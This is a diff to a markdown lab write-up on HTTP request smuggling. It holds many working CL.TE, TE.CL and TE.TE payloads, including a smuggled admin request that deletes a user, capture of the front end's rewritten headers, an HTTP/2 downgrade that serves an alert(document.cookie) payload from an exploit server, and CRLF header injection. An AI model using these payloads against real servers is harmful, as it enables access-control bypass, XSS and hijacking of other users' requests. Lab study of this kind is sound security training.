@@ -41,6 +41,7 @@ Host: vulnerable-website.com
 Content-Length: 30  <- Used by the front end in CL.TE
 Connection: keep-alive
 Transfer-Encoding: chunked
+
 0
 ```
 
@@ -83,14 +84,14 @@ In this case, the **reverse-proxy** will **send the whole request** to the **bac
 
 ---
 
-## Demo
+## Demo: TE.CL — smuggle a GPOST request
 
 - Smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.
 - Using the Turbo Intruder TE.CL Attack, multiple duplicate requests were made, in this order:
 
 ```http
 POST / HTTP/1.1
-Host: ac251f861ffc8725c06a343700b9003d.web-security-academy.net
+Host: web-security-academy.net
 Cookie: session=TmGWbnPLPMbUr4iwIZob57sBH4i2kuMK
 Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
@@ -104,7 +105,7 @@ x=y
 
 ```http
 POST / HTTP/1.1
-Host: ac251f861ffc8725c06a343700b9003d.web-security-academy.net
+Host: web-security-academy.net
 Cookie: session=TmGWbnPLPMbUr4iwIZob57sBH4i2kuMK
 Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
@@ -124,7 +125,7 @@ x=1
 
 ```http
 POST / HTTP/1.1
-Host: ac251f861ffc8725c06a343700b9003d.web-security-academy.net
+Host: web-security-academy.net
 Cookie: session=TmGWbnPLPMbUr4iwIZob57sBH4i2kuMK
 Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
@@ -136,7 +137,7 @@ x=y
 0
 ```
 
-### Response
+### Response (TE.CL / GPOST)
 
 ```http
 HTTP/1.1 403 Forbidden
@@ -227,7 +228,7 @@ A series of these requests in this order successfully smuggled in a 2nd request 
 
 ```http
 POST / HTTP/1.1
-Host: ac631f891e4c27dfc10543dc0035006d.web-security-academy.net
+Host: web-security-academy.net
 Cookie: session=v1XJsTUeCJ99lQv3ZLAObLuqPkDG5hzv
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 13
@@ -241,12 +242,13 @@ x=y
 
 ```http
 POST / HTTP/1.1
-Host: ac631f891e4c27dfc10543dc0035006d.web-security-academy.net
+Host: web-security-academy.net
 Cookie: session=v1XJsTUeCJ99lQv3ZLAObLuqPkDG5hzv
 Content-Type: application/x-www-form-urlencoded
 Content-length: 12
 Transfer-Encoding: chunked
 Transfer-encoding: identity
+
 3
 x=y
 5e
@@ -259,7 +261,7 @@ x=1
 
 ```http
 POST / HTTP/1.1
-Host: ac631f891e4c27dfc10543dc0035006d.web-security-academy.net
+Host: web-security-academy.net
 Cookie: session=v1XJsTUeCJ99lQv3ZLAObLuqPkDG5hzv
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 13
@@ -271,7 +273,7 @@ x=y
 0
 ```
 
-### Response
+### Response (TE.TE / GPOST)
 
 ```http
 "Unrecognized method GPOST"
@@ -295,13 +297,14 @@ X-Ignore: X'''
 
 ```http
 POST / HTTP/1.1
-Host: acb01f791f358360c0f7901000650001.web-security-academy.net
+Host: web-security-academy.net
 Cookie: session=eu4TfRuSOBg8KLcGj6LaQE6C3gVsh6Ec
 Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 45
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
 tRANSFER-ENCODING: chunked
+
 3
 x=y
 0
@@ -316,13 +319,14 @@ X-Ignore: X
 
 ```http
 POST / HTTP/1.1
-Host: acb01f791f358360c0f7901000650001.web-security-academy.net
+Host: web-security-academy.net
 Cookie: session=eu4TfRuSOBg8KLcGj6LaQE6C3gVsh6Ec
 Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 13
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
 tRANSFER-ENCODING: chunked
+
 3
 x=y
 0
@@ -355,7 +359,7 @@ And three successive requests did it:
 
 ```http
 POST / HTTP/1.1
-Host: acb01f791f358360c0f7901000650001.web-security-academy.net
+Host: web-security-academy.net
 Cookie: session=eu4TfRuSOBg8KLcGj6LaQE6C3gVsh6Ec
 Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
@@ -372,7 +376,7 @@ x=y
 
 ```http
 POST / HTTP/1.1
-Host: acb01f791f358360c0f7901000650001.web-security-academy.net
+Host: web-security-academy.net
 Cookie: session=eu4TfRuSOBg8KLcGj6LaQE6C3gVsh6Ec
 Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
@@ -393,7 +397,7 @@ x=x
 
 ```http
 POST / HTTP/1.1
-Host: acb01f791f358360c0f7901000650001.web-security-academy.net
+Host: web-security-academy.net
 Cookie: session=eu4TfRuSOBg8KLcGj6LaQE6C3gVsh6Ec
 Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
@@ -419,7 +423,7 @@ x=y
 
 ```http
 POST / HTTP/1.1
-Host: acb01f791f358360c0f7901000650001.web-security-academy.net
+Host: web-security-academy.net
 Cookie: session=eu4TfRuSOBg8KLcGj6LaQE6C3gVsh6Ec
 Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
@@ -435,6 +439,7 @@ x=y
 ```http
 GET /admin/delete?username=carlos HTTP/1.1
 Host: localhost
+
 x=x
 ```
 
@@ -463,7 +468,7 @@ x=1'''
 
 ```http
 POST / HTTP/1.1
-Host: ac7e1fbc1e20b9b3c08c808e003b0009.web-security-academy.net
+Host: web-security-academy.net
 Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 13
@@ -477,12 +482,13 @@ x=y
 
 ```http
 POST / HTTP/1.1
-Host: ac7e1fbc1e20b9b3c08c808e003b0009.web-security-academy.net
+Host: web-security-academy.net
 Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-length: 12
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
 tRANSFER-ENCODING: chunked
+
 3
 x=y
 5f
@@ -495,12 +501,13 @@ x=1
 
 ```http
 POST / HTTP/1.1
-Host: ac7e1fbc1e20b9b3c08c808e003b0009.web-security-academy.net
+Host: web-security-academy.net
 Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 13
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
 tRANSFER-ENCODING: chunked
+
 3
 x=y
 0
@@ -536,12 +543,13 @@ After a few reqs:
 
 ```http
 POST / HTTP/1.1
-Host: ac7e1fbc1e20b9b3c08c808e003b0009.web-security-academy.net
+Host: web-security-academy.net
 Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 13
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
 tRANSFER-ENCODING: chunked
+
 3
 x=y
 0
@@ -549,12 +557,13 @@ x=y
 
 ```http
 POST / HTTP/1.1
-Host: ac7e1fbc1e20b9b3c08c808e003b0009.web-security-academy.net
+Host: web-security-academy.net
 Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-length: 12
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
 tRANSFER-ENCODING: chunked
+
 3
 x=y
 70
@@ -568,12 +577,13 @@ x=1
 
 ```http
 POST / HTTP/1.1
-Host: ac7e1fbc1e20b9b3c08c808e003b0009.web-security-academy.net
+Host: web-security-academy.net
 Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 13
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
 tRANSFER-ENCODING: chunked
+
 3
 x=y
 0
@@ -589,12 +599,13 @@ x=y
 
 ```http
 POST / HTTP/1.1
-Host: ac7e1fbc1e20b9b3c08c808e003b0009.web-security-academy.net
+Host: web-security-academy.net
 Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-length: 12
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
 tRANSFER-ENCODING: chunked
+
 3
 x=y
 70
@@ -631,12 +642,13 @@ These *requests* deleted carlos:
 
 ```http
 POST / HTTP/1.1
-Host: ac7e1fbc1e20b9b3c08c808e003b0009.web-security-academy.net
+Host: web-security-academy.net
 Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 13
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
 tRANSFER-ENCODING: chunked
+
 3
 x=y
 0
@@ -644,12 +656,13 @@ x=y
 
 ```http
 POST / HTTP/1.1
-Host: ac7e1fbc1e20b9b3c08c808e003b0009.web-security-academy.net
+Host: web-security-academy.net
 Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 13
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
 tRANSFER-ENCODING: chunked
+
 3
 x=y
 0
@@ -657,12 +670,13 @@ x=y
 
 ```http
 POST / HTTP/1.1
-Host: ac7e1fbc1e20b9b3c08c808e003b0009.web-security-academy.net
+Host: web-security-academy.net
 Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-length: 12
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
 tRANSFER-ENCODING: chunked
+
 3
 x=y
 89
@@ -676,12 +690,13 @@ x=1
 
 ```http
 POST / HTTP/1.1
-Host: ac7e1fbc1e20b9b3c08c808e003b0009.web-security-academy.net
+Host: web-security-academy.net
 Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 13
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
 tRANSFER-ENCODING: chunked
+
 3
 x=y
 0
@@ -783,7 +798,7 @@ Finally note that in this attack we are still attacking ourselves to learn how t
 
 ---
 
-## Demo
+## Demo: revealing the front-end's rewritten header
 
 This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
 
@@ -802,7 +817,7 @@ Then smuggle a request to the back-end server that includes the added header, ac
 
    ```http
    POST / HTTP/1.1
-   Host: ac0e1f141ec03abfc0b6a6ec002b006e.web-security-academy.net
+   Host: web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 125
    tRANSFER-ENCODING: chunked
@@ -827,7 +842,7 @@ Then smuggle a request to the back-end server that includes the added header, ac
 
 ```http
 POST / HTTP/1.1
-Host: acd11f5b1f0e833cc0e4960b00fe00b2.web-security-academy.net
+Host: web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 125
 tRANSFER-ENCODING: chunked
@@ -846,7 +861,7 @@ search=PHONE
 
 ```http
 POST / HTTP/1.1
-Host: acd11f5b1f0e833cc0e4960b00fe00b2.web-security-academy.net
+Host: web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
 Content-length: 124
 tRANSFER-ENCODING: chunked
@@ -868,7 +883,7 @@ search=PHONE
 
 ```http
 POST / HTTP/1.1
-Host: acd11f5b1f0e833cc0e4960b00fe00b2.web-security-academy.net
+Host: web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 125
 tRANSFER-ENCODING: chunked
@@ -885,7 +900,7 @@ search=PHONE
 
 ```http
 POST / HTTP/1.1
-Host: acd11f5b1f0e833cc0e4960b00fe00b2.web-security-academy.net
+Host: web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 125
 tRANSFER-ENCODING: chunked
@@ -909,7 +924,7 @@ search=PHONE
     <section class=blog-header>
     <h1>0 search results for 'PHONEPOST / HTTP/1.1
 X-lFuLwp-Ip: 173.94.163.116
-Host: acd11f5b1f0e833cc0e4960b00fe00b2.web-security-academy.net
+Host: web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 125
 tRANSFE'</h1>
@@ -925,7 +940,7 @@ Then added it to the smuggled request with 127.0.0.1 and sent this through Repea
 
 ```http
 POST / HTTP/1.1
-Host: acd11f5b1f0e833cc0e4960b00fe00b2.web-security-academy.net
+Host: web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 75
 tRANSFER-ENCODING: chunked
@@ -1108,7 +1123,7 @@ NETFLIXSUX
 
 ```http
 POST / HTTP/2
-Host: ac431fe71e99be12c0542b47009f0047.web-security-academy.net
+Host: web-security-academy.net
 Content-Length: 0
 
 0
@@ -1126,13 +1141,13 @@ Went to the exploit server and loaded the payload `alert(document.cookie)`, stor
 
 ```http
 POST / HTTP/2
-Host: ac431fe71e99be12c0542b47009f0047.web-security-academy.net
+Host: web-security-academy.net
 Content-Length: 0
 
 0
 
 GET /resources HTTP/1.1
-Host: exploit-ac0a1f0b1ebebe27c07b2bfb010e00a1.web-security-academy.net
+Host: exploit.web-security-academy.net
 Content-Length: 5
 
 x=1
@@ -1175,17 +1190,17 @@ This lab supports HTTP/2 but doesn't advertise this via ALPN. To send HTTP/2 req
 
 ```http
 GET /  HTTP/1.1
-Host:  accf1f361e00dc5fc008caa50018008a.web-security-academy.net
-Foo: bar^~Host: accf1f361e00dc5fc008caa50018008a.web-security-academy.net  ^~^ GET /robots.txt HTTP/1.1*~Foo: bar
+Host:  web-security-academy.net
+Foo: bar^~Host: web-security-academy.net  ^~^ GET /robots.txt HTTP/1.1*~Foo: bar
 ```
 
 ```http
 :method  GET
 : path/
-:authority  accf1f361e00dc5fc008caa50018008a.web-security-academy.net
+:authority  web-security-academy.net
 foo bar
 
-      Host: accf1f361e00dc5fc008caa50018008a.web-security-academy.net
+      Host: web-security-academy.net
 
       GET /robots.txt HTTP/1.1
       X-Ignore: x
@@ -1221,7 +1236,7 @@ The back-end server prioritizes the Transfer-Encoding header: Chunked, and ignor
 
 ```http
 POST / HTTP/1.1
-Host: acb01f791f358360c0f7901000650001.web-security-academy.net
+Host: web-security-academy.net
 Cookie: session=eu4TfRuSOBg8KLcGj6LaQE6C3gVsh6Ec
 Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
